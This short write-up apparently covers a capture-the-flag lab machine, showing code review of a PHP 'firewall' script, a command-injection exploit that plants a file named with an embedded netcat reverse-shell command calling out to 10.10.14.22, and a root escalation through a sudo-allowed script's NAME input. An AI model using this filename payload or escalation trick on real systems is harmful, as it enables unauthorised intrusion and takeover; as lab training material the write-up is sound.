Post Exploitation - Doing code review and changing script behaviors

After a quick enumeration we found an interesting file named check_attack.php under the user guly’s home with the following content:

This file has the following permissions:

-r–r–r–. 1 root root 782 Oct 30 2018 check_attack.php

Doing basic code review we noticed that the purpose of this file is to be executed as a small firewall. The script deals with some logs and checks to indentify any potential attacker that doesn’t follow valid IP formats when creating files under /var/www/html/uploads. There’s a critical vulnerable point: exec on line 29 because the user input is stored into $path$value where the $value is the name of the file created under /var/www/html/uploads directory. This leads to a vulnerability named command injection because the attacker is able create a file and append a command on its name.

To exploit this vulnerability let’s create a file inside /var/www/html/uploads directory with named ;nc -e \$(which bash) 10.10.14.22 4444:

After some time we got a reverse shell connection as guly user:

After that we need to enumerate again in order to escalate our privileges to root. The sudo -l command reveals an interesting script located at /usr/local/sbin/changename.sh. The changename.sh script has root privileges and the following content:

The script needs 4 inputs to be executed:

  • NAME
  • PROXY_METHOD
  • BROWSER_ONLY
  • BOOTPROTO

By inserting /bin/bash on NAME input we’re able to spawn a shell as root user!
